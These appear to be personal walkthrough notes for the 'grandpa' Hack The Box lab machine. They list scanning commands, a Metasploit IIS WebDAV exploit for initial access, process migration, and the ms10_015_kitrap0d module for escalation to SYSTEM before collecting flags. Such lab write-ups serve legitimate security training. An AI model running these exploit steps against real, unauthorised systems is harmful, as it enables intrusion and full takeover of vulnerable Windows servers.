ping 10.10.10.14
whatweb 10.10.10.14

echo "10.10.10.14 grandpa.htb" >> /etc/hosts
nmap grandpa.htb

msfconsole
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set lport, lhost and rhost
run

cd c:/
cd "Documents and Settings"
cd Harry -> Operation failed: Access is denied.

ps -> find NETWORK PRIVILEGES
migrate <pid>

getuid -> NETWORK PRIVILEGES
background

metasploit privilege escalation (https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)
use windows/local/ms10_015_kitrap0d
set lport, lhost and session
run

getuid -> SYSTEM PRIVILEGES
cd "Documents and Settings"

get flags